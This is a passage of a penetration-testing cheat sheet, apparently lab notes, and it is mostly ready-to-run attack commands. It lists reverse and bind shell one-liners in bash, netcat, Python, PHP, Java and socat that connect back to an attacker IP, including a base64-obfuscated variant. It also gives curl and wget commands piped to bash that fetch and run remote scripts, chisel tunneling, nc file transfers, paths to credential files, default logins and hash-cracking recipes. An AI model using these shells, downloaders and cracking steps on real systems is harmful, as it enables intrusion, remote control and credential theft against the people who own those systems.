<strong>port</strong>, <strong>-v</strong>=<strong>verbose</strong>  <strong>-n= skip DNS name resolution </strong>(connect to..)<br /><strong>nc 10.10.14.11 9001  </strong>					<strong>#victim </strong>(use attacker IP)		(also nc -nv<strong> </strong>...)</div><div class='page'><h1 class='title level-3'>redirect output</h1><br/><strong><span style="color:#0000ff;">#redirect</span></strong> <strong><span style="color:#0000ff;">output</span></strong><br /><strong>nc -lp 9001 &gt; </strong>ovrflw      															#attacker<br /><strong>nc</strong> -<strong>w 5 </strong>10.8.185.233 <strong>9001 &lt;</strong> /usr/local/bin/<strong>ovrflw</strong>  				#victim, <strong>w=timeout</strong><br /><br /><strong><span style="color:#0000ff;">#files</span></strong><br /><strong>nc -nlvp 9001</strong>&gt; <strong>incoming.exe</strong><br /><strong>nc -nv</strong> 10.11.0.22 9001&lt; /usr/share/windows-resources/binaries/<strong>wget.exe</strong></div><div class='page'><h1 class='title level-2'>pentestmonkey</h1><br/><strong><span style="color:#0000ff;">PENTESTMONKEY</span></strong></div><div class='page'><h1 class='title level-3'>bash</h1><br/><strong><span style="color:#0000ff;">Bash</span></strong><br /><strong>bash -i &gt;&amp; /dev/tcp/10.10.14.11/9001 0&gt;&amp;1 </strong><br /><strong>bash -c</strong> &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.11/9001 0&gt;&amp;1&quot;<br /><br /><strong><span style="color:#0000ff;">#execution</span></strong><br />curl 10.10.14.11:8000/<strong>shell.sh</strong> -o /tmp/sh<br /><strong>bash</strong> /tmp/sh<br /></div><div class='page'><h1 class='title level-3'>netcat</h1><br/><strong><span style="color:#0000ff;">Netcat</span></strong><br />rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc <strong>10.10.14.11</strong> <strong>9001</strong>&gt;/tmp/f<br /><br /></div><div class='page'><h1 class='title level-3'>python</h1><br/><strong><span style="color:#0000ff;">PYTHON</span></strong><br /><strong>python -c &#39;</strong>import socket,subprocess,os;<br />s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br />s.connect((&quot;10.10.14.11&quot;,9001));<br />os.dup2(s.fileno(),0);  <br />os.dup2(s.fileno(),1);  <br />os.dup2(s.fileno(),2);<br />p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);<strong>&#39;</strong><br /><strong><span style="color:#0000ff;">#inline</span></strong><br />python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;<br /><br /><strong><span style="color:#0000ff;">#execution</span></strong><br />python -m <strong>SimpleHTTPServer</strong><br />nc -lvnp 9001<br />curl 10.10.14.11:<strong>8000/shell.py | python3</strong><br /><br /></div><div class='page'><h1 class='title level-3'>php</h1><br/><strong><span style="color:#0000ff;">PHP</span></strong><br />php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</div><div class='page'><h1 class='title level-3'>java</h1><br/><strong><span style="color:#0000ff;">Java</span></strong><br />r = Runtime.getRuntime()<br />p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.8.50.72/5555;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br />p.waitFor()</div><div class='page'><h1 class='title level-2'>socat</h1><br/><strong><span style="color:#0000ff;">SOCAT</span></strong><br /><strong><span style="color:#0000ff;">#BIND SHEL</span></strong><strong><span style="color:#0000ff;">L</span></strong><br />socat <strong>TCP</strong>:10.10.170.88:4444 -   										#<strong>attacker</strong><br />socat <strong>TCP-L</strong>:4444 <strong>EXEC:&quot;bash -li&quot;  </strong> 									#<strong>victim</strong><br /><br /><strong><span style="color:#0000ff;">#REVERSE</span></strong><strong><span style="color:#0000ff;"> SHELL</span></strong><br />socat <strong>TCP-L</strong>:4444 -     															#<strong>attacker</strong><br />socat <strong>TCP:</strong>10.8.185.233:4444 <strong>EXEC:&quot;bash -li</strong>&quot;					<strong>#victim, IP of attacker</strong><br /></div><div class='page'><h1 class='title level-2'>bash (with base64)</h1><br/><strong><span style="color:#0000ff;">with BASE64 (bash shell)</span></strong><br /><strong>nc</strong> <strong>-lvnp</strong> <strong>9001          																										 	</strong>		#attacker<br />echo -n<strong> &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.11/9001 0&gt;&amp;1&#39;&quot;</strong> |<strong> base64</strong>				 			#victim<br /><strong>echo -n </strong><span style="text-decoration:underline;">YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMS85MDAxIDA+JjEn</span><strong> | base64 -d | bash </strong><br /></div><div class='page'><h1 class='title level-2'>tty shell</h1><br/><strong><span style="color:#0000ff;">TTY SHELL</span></strong><br />echo &#39;import pty;pty.spawn(&quot;/bin/bash&quot;);&#39; &gt; random.py<br />echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.185.233 443 &gt;/tmp/f&quot; &gt; /etc/copy.sh<br />cmd: &quot;<strong>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.185.233 1234 &gt;/tmp/f</strong>&quot;<br /></div><div class='page'><h1 class='title level-1'>port forwarding</h1><br/></div><div class='page'><h1 class='title level-2'>local port forwarding</h1><br/><strong><span style="color:#0000ff;">LOCAL PORT FORWARDING  </span></strong><a href="http://127.0.0.1:1337/">http://127.0.0.1:1337/</a><br /><strong>ssh -i root.key</strong> <strong>-L</strong>9000:10.10.10.75:80 <strong>10.10.10.73  									localhost:9000 → 10.10.10.75:80</strong><br /><strong>~C</strong><br />ssh&gt; <strong>-L 9002:</strong>127.0.0.1<strong>:52846 </strong><br />ssh&gt; <strong>-L 8443:</strong>127.0.0.1<strong>:8443   </strong>									#-L listen on 8443, sends req through ssh to localhost:8443<br />→<strong> then on browser:</strong> <br />    <strong> https://127.0.0.1:8443</strong><br /><br /><strong><span style="color:#0000ff;">#tunneling, localhost</span></strong><br />ssh<strong> -L 6767:</strong>172.17.0.1<strong>:8080 aubreanna@192.168.1.7 </strong><br /></div><div class='page'><h1 class='title level-2'>remote port forwarding</h1><br/><strong><span style="color:#0000ff;">REMOTE PORT FORWARDING</span></strong><br /><strong>ssh</strong> <strong>-R 1337:</strong>127.0.0.1<strong>:52846 </strong>root@10.10.14.11  					 #mio ip<br /><br /> <br /><strong><span style="color:#0000ff;">#socat</span></strong><br /><strong>socat TCP-LISTEN:</strong>8888<strong>,fork TCP:127.0.0.1:80 &amp;  					</strong> #map port 8888 to port 80<br /></div><div class='page'><h1 class='title level-2'>chisel</h1><br/><strong><span style="color:#ff0000;">CHISEL</span></strong>																<strong>#SOCKS proxy</strong><br /><strong>chisel server --reverse --port</strong> <strong>9002</strong> 							<strong>			</strong><strong><span style="color:#0000ff;">#attacker </span></strong><br />python3 -m http.server<br /><br />curl 10.10.16.2:8000/chisel.exe -o <strong>chisel.exe</strong>		<strong>					</strong><strong><span style="color:#0000ff;">#victim</span></strong>													<strong>#tun: proxy#R:3006=&gt;localhost:3006: Listening</strong><br /><strong>.\chisel.exe client 10.10.16.2:9002 </strong>R:8888:localhost:8888<br /><strong>.\chisel.exe client 10.10.16.2:9002 R:3306:localhost:3306</strong> R:8888:localhost:8888<br /><br /><strong><span style="color:#0000ff;">#test</span></strong><br /><strong>nc localhost 3306</strong><br /> <br /> <br /> </div><div class='page'><h1 class='title level-1'>web servers</h1><br/></div><div class='page'><h1 class='title level-2'>simple http server</h1><br/><strong><span style="color:#0000ff;">SIMPLE HTTP SERVER <br />#host</span></strong>								 <br /><strong>python -m SimpleHTTPServer 8080</strong><br /><strong><span style="color:#0000ff;">#victim</span></strong><br /><strong><span style="color:#0000ff;">#bash files</span></strong><br /><strong>curl </strong>http://10.10.16.5:8080/<strong>LinEnum.sh </strong>| <strong>bash</strong><br /><strong>wget -O</strong> - http://10.10.16.5:8080/<strong>LinEnum.sh </strong>| <strong>bash</strong><br /></div><div class='page'><h1 class='title level-2'>http server</h1><br/><strong><span style="color:#0000ff;">HTTP SERVER (python3)</span></strong><br /><strong><span style="color:#0000ff;">#host</span></strong><br /><strong>python3 -m http.server 80</strong><br /><strong><span style="color:#0000ff;">#victim</span></strong><br /><strong>curl </strong>http://10.8.185.233:80/<strong>LinEnum.sh </strong>| bash<br /><strong>wget </strong> -O - http://10.8.185.233:80<strong>/LinEnum.sh </strong>| bash<br /></div><div class='page'><h1 class='title level-2'>netcat</h1><br/><strong><span style="color:#0000ff;">NETCAT</span></strong><br /><strong><span style="color:#0000ff;">#host</span></strong><br />cat<strong> LinEnum.sh </strong>| <strong>nc -lvnp 9001 <br /></strong><strong><span style="color:#0000ff;">#victim</span></strong><br /><strong>nc 10.10.14.3 9001</strong> | <strong>bash</strong>   				<br /></div><div class='page'><h1 class='title level-2'>php</h1><br/><strong><span style="color:#0000ff;">PHP</span></strong><br /><strong>php -S </strong>127.0.0.1:80<br /></div><div class='page'><h1 class='title level-1'>networking</h1><br/> <strong>PRIVATE NETWORKS ADDRESS</strong><br /> 10/8 						(10.0.0.0 through 10.255.255.255)<br /> 172.16/12 				(172.16.0.0 through 172.31.255.255)<br /> 192.168/16 			(192.168.0.0 through 192.168.255.255)<br /> <br /><strong><span style="color:#0000ff;">HTTP RESPONSES</span></strong><br /><strong>100-199</strong>: Information<br /><strong>200-299</strong>: <strong>Successes</strong> (200 OK is the &quot;normal&quot; response for a GET)<br /><strong>300-399</strong>: <strong>Redirects</strong> (the information you want is elsewhere)<br /><strong>400-499</strong>: <strong>Client errors </strong>(You did something wrong, like asking for something that doesn&#39;t exist)<br /><strong>500-599</strong>: <strong>Server errors </strong>(The server tried, but something went wrong on their side)</div><div class='page'><h1 class='title level-2'>ifconfig</h1><br/><strong><span style="color:#0000ff;">IFCONFIG        </span></strong><br /><strong>ifconfig</strong><br /><strong>ifconfig -a tun0 </strong>										<br /><br /><strong><span style="color:#0000ff;">ip</span></strong><br /><strong>ip a show <br />ip a show tun0</strong></div><div class='page'><h1 class='title level-2'>ping</h1><br/><strong><span style="color:#0000ff;">PING</span></strong><strong><br />ping 10.10.10.100  						</strong><br />ping 10.10.10.100 <strong>-c 2</strong>  					<strong>#stops after 2 ping</strong><br /><strong><span style="color:#0000ff;">#response</span></strong><br /><strong>ttl</strong>= <strong>64</strong> (<strong>linux</strong>)  <br /><strong>ttl</strong>= <strong>127</strong> (<strong>windows</strong>)  <br /><strong>ttl</strong>= <strong>254</strong>  (<strong>cisco</strong>)<br /><br /><strong><span style="color:#0000ff;">#also using netcat</span></strong><br /><strong>nc -nlvp 80</strong><br />http://10.10.14.8/test		#site</div><div class='page'><h1 class='title level-2'>tcpdump</h1><br/><strong><span style="color:#0000ff;">TCPDUMP</span></strong><br />sudo <strong>tcpdump -n -i tun0  										</strong>#<strong>-n</strong>=disable DNS lookup							<br />sudo tcpdump -i tun0 <strong>port 445</strong><br /><br />sudo<strong> tcpdump -i tun0 icmp</strong> 									#dump traffic on network   <br /><strong>ping -n 1 10.10.14.18</strong></div><div class='page'><h1 class='title level-2'>netstat</h1><br/><strong><span style="color:#0000ff;">NETSTAT</span></strong>															<strong><span style="color:#0000ff;">#ports exposed</span></strong><br /><strong><span style="color:#0000ff;">#ports open</span></strong>/ network connections <br /><strong>netstat -tan</strong><br /><strong><span style="color:#0000ff;">#search specific port</span></strong><br /><strong>netstat -tan | grep 8080  </strong>						#see if machine is accessible only in localhost<br />netstat -an | <strong>findstr</strong> 8888<br />netstat -an | <strong>findstr 127.0.0.1</strong><br /><br /><strong><span style="color:#0000ff;">#network connections</span></strong> <strong><span style="color:#0000ff;">(also program name) </span></strong><br /><strong>netstat -antp   </strong>		<br /><br /><strong>netstat -an   </strong>				#all connected machines<br /><strong>netstat -ano   </strong>			#all <strong>ports open</strong> + all connected machines <br /><br />	<br /><br /></div><div class='page'><h1 class='title level-2'>lsof</h1><br/><strong><span style="color:#0000ff;">LSOF 												</span></strong><span style="color:#4d4d4d;">#hosts communicating with the system</span><br /><strong>lsof</strong> <strong>-i :80</strong>   									<strong>	#services using that port</strong><br /></div><div class='page'><h1 class='title level-2'>route</h1><br/><strong><span style="color:#0000ff;">ROUTE</span></strong>						#routing table <strong>    </strong><br /><strong>route</strong><br /></div><div class='page'><h1 class='title level-2'>socket connections</h1><br/><strong><span style="color:#0000ff;">SS</span></strong>	<br /><strong>ss -lnpt  				</strong>										<strong>#ports open</strong><br /><strong>ss -lnpt</strong> |<strong> grep 3306</strong><br /><br /><strong>ss -tulpn </strong>  													<strong>#-tu = TCP/UDP running socket connections</strong></div><div class='page'><h1 class='title level-2'>wireshark</h1><br/><strong><span style="color:#0000ff;">WIRESHARK</span></strong><br /><strong><span style="color:#0000ff;">#ip</span></strong><br /><strong>ip.src == 145.254.160.237 					#</strong>packets originate from the specified IP address <br /><strong>ip.dst == 192.168.1.1  						#</strong>packets destined to the specified IP address <br /><br /><strong><span style="color:#0000ff;">#protocols</span></strong><br /><strong>tcp.port == 22   									#</strong>packets sent via protocol + port specified<br /><strong>udp.port == 67  </strong><br /><br /><strong><span style="color:#0000ff;">#request methods</span></strong><br /><strong>http.request.method == GET </strong>				<strong>#</strong>packets that use a specific method of the protocol http<br /><strong>http.request.method == POST </strong><br /><br /><strong>==, !=, &amp;&amp; </strong>#combine<br /></div><div class='page'><h1 class='title level-3'>tshark</h1><br/><strong><span style="color:#0000ff;">TSHARK</span></strong><br /><strong>tshark -r </strong>holidaythief.<strong>pcap -Y &quot;http&quot; -T fields -e text  								#http requests</strong><br /><strong>tshark -r </strong>holidaythief.<strong>pcap -Y &quot;dns&quot; -T fields -e dns.qry.name 				#</strong>extract<strong> dns from pcap</strong><br /><br /></div><div class='page'><h1 class='title level-2'>dns</h1><br/><strong><span style="color:#0000ff;">etc/hosts</span></strong><br />nano<strong> /etc/hosts</strong><br /><strong><span style="color:#0000ff;">es:</span></strong><br />10.10.10.123 <strong>friendzone.red friendzoneportal.red   					</strong><br /><br />#try also https<br /></div><div class='page'><h1 class='title level-3'>nslookup</h1><br/><strong><span style="color:#0000ff;">NSLOOKUP</span></strong><br /><strong>nslookup</strong><br /> &gt;<strong> server 10.10.10.100  		</strong><strong><span style="color:#0000ff;">#set server</span></strong><br /> &gt;<strong> 127.0.0.1    						#see responses (hostname?)</strong><br /> &gt;<strong> 10.10.10.100   					#reverse lookup</strong><br /></div><div class='page'><h1 class='title level-3'>dnsrecon</h1><br/><strong><span style="color:#0000ff;">DNSRECON 				#reverse lookup   									</span></strong>#scan all subnet<br /><strong>dnsrecon -r </strong>127.0.0.<strong>0/24 -n</strong> 10.10.10.29<strong>   					#-r = range</strong><br /><strong>dnsrecon </strong>-r 10.10.10.0/24 -n 10.10.10.29  					#subnet<br /><strong>dnsrecon -d 10.10.10.100 -r </strong>10.0.0.<strong>0/8  						#-d=domain</strong><br /></div><div class='page'><h1 class='title level-3'>dig</h1><br/><strong><span style="color:#0000ff;">DIG</span></strong>						<strong><span style="color:#0000ff;">#</span></strong><strong><span style="color:#0000ff;">DNS zone transfer</span></strong><br /><strong>dig axfr </strong>@10.10.10.123 <strong>friendzone.red</strong>					#zone<br /><strong>dig axfr @</strong>10.10.10.13 <strong>cronos.htb</strong><br /></div><div class='page'><h1 class='title level-2'>firewall</h1><br/></div><div class='page'><h1 class='title level-3'>ufw</h1><br/><strong><span style="color:#0000ff;">FIREWALL</span></strong><br />sudo <strong>ufw</strong> <strong>allow</strong> <strong>from</strong> 10.10.10.27 <strong>proto tcp</strong> <strong>to any port</strong> 80,443<br /></div><div class='page'><h1 class='title level-1'>important files/directories</h1><br/> <br />  <br /><br /></div><div class='page'><h1 class='title level-2'>important files</h1><br/><strong><span style="color:#ff0000;">IMPORTANT FILES</span></strong><strong><br /></strong><strong><span style="color:#0000ff;">.htaccess<br />robots.txt<br />sitemap.xml</span></strong><br /><br /><strong><span style="color:#0000ff;">/etc/passwd       		 </span></strong><br /><strong><span style="color:#0000ff;">/etc/shadow </span></strong><br /><br /><strong><span style="color:#0000ff;">/home/</span></strong>ash<strong><span style="color:#0000ff;">/.ssh/id_rsa    </span></strong><strong>					#private key</strong><br /><strong><span style="color:#0000ff;">/home/</span></strong>ash<strong><span style="color:#0000ff;">/.ssh/authorized_keys</span></strong><br /><strong><span style="color:#0000ff;">/home/</span></strong>ash<strong><span style="color:#0000ff;">/.bash_history</span></strong><br /><strong><span style="color:#0000ff;">/proc/self/environ     </span></strong><strong>							#user agent</strong><br /><strong><span style="color:#0000ff;">/proc/self/status</span></strong><br /><strong><span style="color:#0000ff;">/var/lib/</span></strong><br /><strong><span style="color:#0000ff;">/proc/self/cmdline</span></strong><br /><br /><br /><strong>#tomcat</strong><br /><strong>/usr/share/tomcat9/bin/catalina.sh</strong></div><div class='page'><h1 class='title level-2'>important directories</h1><br/><strong><span style="color:#ff0000;">IMPORTANT DIRECTORIES    </span></strong><br /><strong><span style="color:#0000ff;">/var/log    </span></strong><strong>   				</strong><br /><strong><span style="color:#0000ff;">/root</span></strong><br /><strong><span style="color:#0000ff;">/tmp</span></strong><br /><strong><span style="color:#0000ff;">/dev/shm/ </span></strong><strong> 						#RAM temp archiving</strong><br />   <br /><strong><span style="color:#0000ff;"> </span></strong><br /></div><div class='page'><h1 class='title level-2'>default credentials</h1><br/><strong><span style="color:#ff0000;">DEFAULT CREDENTIALS</span></strong><strong><br />admin:admin  <br />admin:password  <br />guest:guest<br /></strong><br /></div><div class='page'><h1 class='title level-1'>compilers</h1><br/></div><div class='page'><h1 class='title level-2'>gcc</h1><br/><strong><span style="color:#0000ff;">GCC  (C compiler)</span></strong><br /><strong>gcc</strong> <strong>dirtyc0w.c -o exploit  </strong>    					 #<strong>-o=output exe</strong><br />gcc exploit.c -o exploit   								<strong> #kernel exploit 16.04.4</strong><br /><strong>./exploit</strong><br /><br /></div><div class='page'><h1 class='title level-2'>mingw32</h1><br/><strong><span style="color:#0000ff;">MINGW32 </span></strong>																#to execute on different machines<br /><strong>x86_64-w64-mingw32-gcc</strong> hello.c <strong>-o </strong>hello.exe</div><div class='page'><h1 class='title level-1'>conversions</h1><br/></div><div class='page'><h1 class='title level-2'>iconv</h1><br/><strong><span style="color:#0000ff;">ICONV</span></strong><br /><strong>file -i </strong>input.file<br /><strong>iconv -f </strong>UTF-8<strong> -t </strong>ISO-8859-15 input.txt &gt; out.txt  												# <strong>-f= from ISO </strong>				 <strong> -t= to UTF-8 (linux default)</strong><br />iconv <strong>-f </strong>ISO-8859-1 -<strong>t </strong>UTF-8 input.file -o out.file<br /></div><div class='page'><h1 class='title level-1'>encodings</h1><br/></div><div class='page'><h1 class='title level-2'>base64</h1><br/><strong><span style="color:#0000ff;">BASE64</span></strong><br /><strong><span style="color:#0000ff;">#encode</span></strong><br />echo -n &#39;mcinventoryv4er9ll1!ss&#39; | <strong>base64  </strong><br /><strong>cat reverse.ps1 | iconv -t UTF-16-le | base64 -w0   													#windows conversion</strong><br />cat reverse.ps1 | iconv -t UTF-16-le | base64 -w0 | <strong>xclip -selection clipboard  </strong>				#copy to clipboard<br /><br /><strong><span style="color:#0000ff;">#decode</span></strong><br />echo &#39;Qm9iIC0gIVBAJCRXMHJEITEyMw<strong>==</strong>&#39; | <strong>base64 -d </strong> <br />echo <strong>-n </strong>dGVzdDJ2NGVyOWxsMSFzcw<strong>==</strong> | <strong>base64 -d</strong><br /><strong>base64 -d </strong>secret.<strong>txt</strong><br /></div><div class='page'><h1 class='title level-2'>hex</h1><br/><strong><span style="color:#0000ff;">HEX</span></strong><br /><strong><span style="color:#0000ff;">#encode </span></strong><strong>          </strong><br />echo &quot;{\&quot;company\&quot;:\&quot;The Best Festival Company\&quot;, \&quot;username\&quot;:\&quot;santa\&quot;}&quot; | <strong>xxd -p     				#-p = continuous</strong><br /><strong>xxd</strong> image.png | <strong>head -n 1   </strong> 																											#extract file signature<br /><br /><strong><span style="color:#0000ff;">#decode </span></strong><strong>                   </strong><br />echo &quot;43616e64792043616e652053657269616c204e756d6265722038343931&quot; | <strong>xxd -r -p</strong>			<strong>#-r = revert encoding</strong><br /><strong>xxd -r </strong>password_backup <strong>&gt; </strong>1        																										<strong>#file</strong></div><div class='page'><h1 class='title level-3'>hexedit</h1><br/><strong><span style="color:#0000ff;">HEXEDIT</span></strong><br /><strong>hexedit</strong> image.png</div><div class='page'><h1 class='title level-1'>encryptions</h1><br/></div><div class='page'><h1 class='title level-2'>hashes</h1><br/><strong><span style="color:#ff0000;background-color:#ffff00;">HASHING</span></strong><br /><strong>MD4, MD5, MD5crypt<br />NTLM<br />SHA-1, SHA-256, SHA-512, SHA-512 crypt<br />Bcrypt<br /> </strong><br /> <br /><strong><span style="color:#0000ff;">Prefix</span></strong><br /><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br />$1$     												<strong>md5crypt</strong><br />$2$, $2a$, $2b$, $2x$, $2y$  			<strong>Bcrypt</strong><br />$6$     												<strong>sha512crypt</strong><br />  <br /><strong>$format$rounds$salt$hash</strong><br /><br /><strong><span style="color:#0000ff;">#mkpasswd</span></strong><br /><strong>mkpasswd</strong> <strong>-m sha-512</strong> password1234</div><div class='page'><h1 class='title level-2'>md5sum/sha1sum</h1><br/><strong><span style="color:#0000ff;">HASHSUM</span></strong><br /><strong><span style="color:#0000ff;">#md5sum</span></strong><br /><strong>md5sum</strong> note1.txt.gpg  <br /><strong><span style="color:#0000ff;">#sha1sum</span></strong><br /><strong>sha1sum</strong> file8<br /><br /><strong><span style="color:#0000ff;">#compare 2 files</span></strong><br /><strong>md5sum</strong> login*  <br /><br /><strong>#check online</strong><br /><strong>md5sum</strong> /snap/core/8689/usr/bin/<strong>sudo   			</strong><br />• https://www.virustotal.com/gui/home/search<br /> <br /></div><div class='page'><h1 class='title level-2'>openssl</h1><br/><strong><span style="color:#0000ff;">OPENSSL</span></strong><br />#password creation<br /><strong>openssl passwd </strong>password1234<br /><strong>openssl</strong> <strong>passwd</strong> <strong>-1</strong> <strong>-salt</strong> new 123<br /><br /><strong><span style="color:#0000ff;">#RSA key</span></strong><br /><strong>openssl</strong> <strong>rsautl</strong> <strong>-decrypt</strong> <strong>-inkey </strong>private.key<strong> -in</strong> note2_encrypted.txt <strong>-out</strong> note2.txt <br /></div><div class='page'><h1 class='title level-2'>gpg</h1><br/><strong><span style="color:#0000ff;">GPG</span></strong><br /><strong><span style="color:#0000ff;">#encrypt</span></strong><br /><strong>gpg --cipher-algo AES-256 --symmetric </strong>secret.txt   							<strong>#creates .gpg file</strong><br /><br />gpg --import<strong> </strong>tryhackme.key<br /><br /><br /><strong><span style="color:#0000ff;">#decrypt</span></strong><br /><strong>gpg</strong> message.gpg  (<strong>--decrypt</strong> predefinito)<br /><strong>gpp-decrypt </strong>edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ<br /><br /> </div><div class='page'><h1 class='title level-2'>hash identifier</h1><br/><strong><span style="color:#0000ff;">HASH IDENTIFIER</span></strong><br /><strong>hash-identifier</strong><br /></div><div class='page'><h1 class='title level-2'>hashcat</h1><br/><strong><span style="color:#0000ff;">HASHCAT</span></strong><br /><strong><span style="color:#0000ff;">#list all hashes example</span></strong><strong><br />hashcat --example-hashes</strong> | <strong>grep -i krb -A3 -B3 </strong> <br /><strong><span style="color:#0000ff;">#show already cracked hash</span></strong><br /><strong>hashcat -m 20</strong> hashforcrack.txt <strong>--show </strong><br />hashcat<strong> --username </strong>-m 20<strong> </strong>hashforcrack.txt <strong>--show</strong><br /><strong><span style="color:#0000ff;">#saved hash</span></strong><br />hashcat/<strong>hashcat.potfile</strong>																					hashcat -I       #see GPU support<br /><br /><strong><span style="color:#0000ff;">#mode</span></strong><br /><strong>hashcat -m 20 hashforcrack.txt rockyou.txt</strong>											#<strong>m= hash-type</strong><br /><strong>hashcat</strong> <strong>-m</strong> <strong>1800</strong> unshadowed.txt rockyou.txt -O<br /><strong>hashcat -a 0</strong> <strong>-m 1400</strong> hashforcrack.txt rockyou.txt    								#<strong>a =</strong> <strong>attack-mode 0 = dictionary</strong><br /><strong>hashcat</strong> -a 0 <strong>-m 0</strong> 56ab24c15b72a457069c5ea42fcfc640 rockyou.txt  				<strong>#inline hash</strong><br />• <strong>MD5</strong>               0<br />• <strong>SHA1</strong>             100<br />• <strong>NTLM</strong>            1000<br />• <strong>SHA2-256</strong>     1400<br />• <strong>SHA2-512</strong>     1700<br />• <strong>sha512crypt</strong> 1800<br />• <strong>bcrypt</strong>            3200<br /><br /> <br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-3'>rules</h1><br/><strong><span style="color:#0000ff;">RULES    </span></strong><br /><strong>hashcat</strong> <strong>-m</strong> <strong>3200</strong> hashforcrack.txt pw <strong>-r</strong> /usr/share/hashcat/rules/<strong>best64.rule</strong><br /><br />#oppure<br /><strong>hashcat </strong>--force pw <strong>-r</strong> /usr/share/hashcat/rules/<strong>best64.rule --stdout   </strong>							#generate password andput in <strong>pwlist</strong><br /><strong>hashcat</strong> <strong>-m</strong> <strong>3200</strong> hashforcrack.txt <strong>pwlist</strong></div><div class='page'><h1 class='title level-2'>john the ripper</h1><br/><strong><span style="color:#0000ff;">JOHN THE RIPPER</span></strong><br /><strong>john hashforcrack.txt</strong><br /><strong>john</strong> <strong>--wordlist=</strong>rockyou.txt shadow.txt  								<strong>#wordlist</strong><br /><strong><span style="color:#0000ff;">#see already creacked</span></strong><br /><strong>john </strong>hashforcrack.txt <strong>--show</strong><br /> <br /><strong><span style="color:#0000ff;">#see formats</span></strong><br />john <strong>--list=formats</strong> | grep -iF &quot;md5&quot;<br /> <br /><strong><span style="color:#0000ff;">#format</span></strong><br /><strong>john</strong> <strong>--format=raw-md5</strong> --wordlist=rockyou.txt hashforcrack.txt<br /><strong>john --format=bcrypt</strong> --wordlist=rockyou.txt hashforcrack.txt<br /><strong>• raw-md5<br />• raw-sha1<br />• Raw-SHA256 <br />• sha512crypt<br />• bcrypt </strong><br /><br /><br /></div><div class='page'><h1 class='title level-3'>unshadow</h1><br/><span style="color:#0000ff;">• </span><strong><span style="color:#0000ff;">passwd.txt</span></strong> <strong>(</strong><strong><span style="color:#0000ff;">/etc/</span></strong><strong><span style="color:#0000ff;">passwd</span></strong><strong>)</strong><br />buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::<br /><span style="color:#0000ff;">• </span><strong><span style="color:#0000ff;">shadow.txt</span></strong> <strong>(</strong><strong><span style="color:#0000ff;">/etc/shadow</span></strong><strong>)</strong><br />TCM:x:1000:1000:user,,,:/home/user:/bin/bash<br /><strong>buddy:x:1000:1000:buddy,,,:/home/buddy:/bin/bash</strong><br /><br /><strong><span style="color:#0000ff;">#unshadow</span></strong><br /><strong>unshadow</strong> <strong>passwd.txt</strong> <strong>shadow.txt </strong>&gt; <strong>unshadowed</strong>.txt    <br /><strong>john</strong> --wordlist=rockyou.txt <strong>unshadowed</strong>.txt     																	#also<strong> --format=sha512crypt</strong><br /></div><div class='page'><h1 class='title level-3'>ssh2john</h1><br/><strong><span style="color:#0000ff;">ssh2john</span></strong><br />/usr/share/john/<strong>ssh2john.py</strong> <strong>id_rsa</strong> &gt; <strong>hash</strong>  												#(.key, .hash)<br /><strong>john</strong> <strong>--wordlist</strong>=rockyou.txt <strong>hash</strong><br /></div><div class='page'><h1 class='title level-3'>zip2john</h1><br/><strong><span style="color:#0000ff;">zip2john</span></strong><br /><strong>zip2john</strong> Access_Control.<strong>zip</strong> &gt; Access_Control.<strong>hash</strong><br /><strong>john</strong> Access_Control.<strong>hash</strong><br /><br /></div><div class='page'><h1 class='title level-3'>rar2john</h1><br/><strong><span style="color:#0000ff;">rar2john</span></strong><br /><strong>rar2john</strong> rarfile.<strong>rar</strong> &gt; <strong>rarhash</strong><br /><strong>john</strong> <strong>--wordlist</strong>=rockyou.txt  <strong>rarhash</strong></div><div class='page'><h1 class='title level-3'>gpg2john</h1><br/><strong><span style="color:#0000ff;">gpg2john</span></strong><br /><strong>gpg2john</strong> secret.<strong>gpg</strong> &gt; <strong>hash</strong><br /><strong>john</strong> <strong>--wordlist</strong>=rockyou.txt <strong>--format=gpg hash</strong><br /></div><div class='page'><h1 class='title level-3'>keepass2john</h1><br/><strong><span style="color:#0000ff;">keepass2john								#.KDBX</span></strong><br /><strong>keepass2john </strong>CEH.<strong>kdbx</strong><br /><strong>hashcat -m 13400 </strong>hashforcrack.txt rockyou.txt   															#then go to KeePassX and use .kdbx + psw</div><div class='page'><h1 class='title level-3'>single mode</h1><br/><strong><span style="color:#0000ff;">Single mode</span></strong><br />john <strong>--single</strong> <strong>--format</strong>=raw-md5 <strong>hash.txt</strong><br /><br />Joker:1efee03cdcb96d90ad48ccc7b8666033</div><div class='page'><h1 class='title level-2'>hydra</h1><br/> <strong><span style="color:#0000ff;">HYDRA</span></strong><br /> <br />  <br /></div><div class='page'><h1 class='title level-3'>ftp</h1><br/><strong><span style="color:#0000ff;">ftp</span></strong>																									<strong>	#force ftp login</strong><br /><strong>hydra -l </strong>mike<strong> -P</strong> 